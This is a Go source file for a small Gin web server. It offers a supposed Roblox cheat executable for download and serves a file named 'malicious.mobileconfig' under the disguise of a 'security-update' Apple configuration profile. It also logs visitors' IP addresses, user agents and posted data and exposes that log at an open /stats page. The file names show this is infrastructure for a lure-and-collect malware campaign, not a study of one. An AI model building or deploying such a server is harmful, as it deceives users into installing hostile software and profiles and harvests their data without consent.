// main.go
package main

import (
    "fmt"
    "io"
    "log"
    "net/http"
    "os"

    "github.com/gin-gonic/gin"
)

func main() {
    gin.SetMode(gin.ReleaseMode)
    router := gin.New()
    router.Use(gin.Recovery())

    router.GET("/", func(c *gin.Context) {
        c.File("index.html")
    })

    router.GET("/download-cheat", func(c *gin.Context) {
        c.File("RobloxCheat.exe")
    })

    router.GET("/install-profile", func(c *gin.Context) {
        c.Header("Content-Type", "application/x-apple-aspen-config")
        c.Header("Content-Disposition", "attachment; filename=security-update.mobileconfig")
        c.File("malicious.mobileconfig")
    })

    router.POST("/log", func(c *gin.Context) {
        body, _ := io.ReadAll(c.Request.Body)
        ip := c.ClientIP()
        ua := c.Request.UserAgent()
        
        f, _ := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        defer f.Close()
        f.WriteString(fmt.Sprintf("IP: %s\nUA: %s\nData: %s\n---\n", ip, ua, string(body)))
        
        c.JSON(200, gin.H{"status": "ok"})
    })

    router.GET("/stats", func(c *gin.Context) {
        data, err := os.ReadFile("log.txt")
        if err != nil {
            c.String(200, "No data yet")
            return
        }
        c.String(200, string(data))
    })

    port := os.Getenv("PORT")
    if port == "" {
        port = "8080"
    }
    router.Run(":" + port)
}
